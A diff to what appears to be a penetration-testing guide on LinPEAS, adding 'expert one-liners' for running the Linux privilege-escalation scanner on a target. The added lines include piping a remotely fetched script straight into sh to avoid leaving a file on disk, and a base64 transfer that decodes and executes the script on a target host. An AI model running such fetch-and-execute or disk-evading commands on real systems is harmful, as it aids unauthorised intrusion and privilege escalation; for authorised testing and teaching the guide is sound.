@@ -84,9 +84,35 @@ LinPEAS is famous for its color-coded findings. **Focus on these first.**
 
 ---
 
-### 📝 Strategic Standard Checklist:
-*   **Red/Yellow Priority**: Always emphasize that **RED/YELLOW** is the most important output.
-*   **Clean Boot**: Added the `-s` (Superfast) flag recommendation for targets with huge file systems where a full scan would take hours.
-*   **GTFOBins Reference**: Essential link for any Linux PrivEsc guide.
+---
+
+## 💡 Expert One-Liners
+
+```bash
+# In-memory execution (no file on disk)
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Save output with colors (use less -R to view)
+./linpeas.sh | tee linpeas_output.txt
+
+# Fast scan + save
+./linpeas.sh -s | tee -a /dev/shm/lpe.txt
+
+# Run with password for sudo checks
+./linpeas.sh -P 'password123'
+
+# Transfer via base64 (when no wget/curl)
+# On attacker: base64 linpeas.sh | xclip
+# On target: echo "<base64>" | base64 -d | sh
+```
+
+---
+
+## 🔗 Links
+
+- After LinPEAS → cross-reference findings with GTFOBins (https://gtfobins.github.io)
+- Alternative: linEnum, linux-exploit-suggester, lse.sh
+- Combine with: manual enumeration commands for verification
+- Windows equivalent: WinPEAS
 
 
